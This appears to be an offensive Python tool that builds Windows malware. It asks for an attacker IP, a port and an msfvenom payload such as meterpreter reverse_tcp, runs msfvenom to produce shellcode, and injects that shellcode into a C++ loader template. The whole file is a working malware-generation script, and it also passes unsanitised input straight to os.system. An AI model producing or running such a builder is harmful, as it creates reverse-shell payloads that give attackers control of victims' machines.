#!/usr/bin/python

# This script requires msfvenom
import socket
import os
import random
import string

tmp_file_name = "msf-venom-sample.bin.tmp"

def gen_msfvenom_sample(lhost: str, lport: int, payload: str, output_file: str):
    chars = ''.join(random.choices(string.ascii_lowercase, k=16))
    os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f c  > {output_file}")
    return

def gen_create_helper(input_file:str,output_file:str):
    tmp_frame_file = ''.join(random.choices(string.ascii_lowercase, k=5))
    os.system(f"cp frame.cpp {tmp_frame_file}")
    with open(input_file, "r") as file1:
        new_contents = ""
        with open(tmp_frame_file, "r") as file2:
            contents1 = file1.read()
            #print(contents1)
            contents2 = file2.read()
            #print(contents2)
            new_contents = contents2.replace("// PYTHON_REPLACE_ME_HERE", contents1.replace(contents1[0:8],"const"))
        with open(tmp_frame_file, "w") as file3:
            file3.write(new_contents)
    os.system(f"mv {tmp_frame_file} {output_file}")
    return

def print_welcome():
    print("Hello fellow hacker.")


def check_addr(addr: str):
    try:
        socket.inet_aton(addr)
        return True
    except socket.error:
        return False


if __name__ == "__main__":
    tmp_file_name = "msf-venom-sample.bin.tmp"
    lhost = input("What is the LHOST: ")
    if not check_addr(lhost):
        print("Not valid ip address")
        exit(-1)
    lport = input("What is the LPORT: ")
    if not lport.isnumeric() and int(lport) >= 0 and int(lport) <= 65535:
        print("Not valid port number")
        exit(-2)
    payload = input("What is the msfvenom payload you want to use? ")
    if not payload.startswith("windows"):
        print("Only windows payloads are supported at this time.")
        print("Payload must start with windows/. Ex: windows/meterpreter/reverse_tcp")
        exit(-3)
    output_file = input("Enter output file name: ")
    gen_msfvenom_sample(lhost, int(lport), payload, tmp_file_name)
    gen_create_helper(tmp_file_name, output_file)
    os.system(f"rm {tmp_file_name}")
    

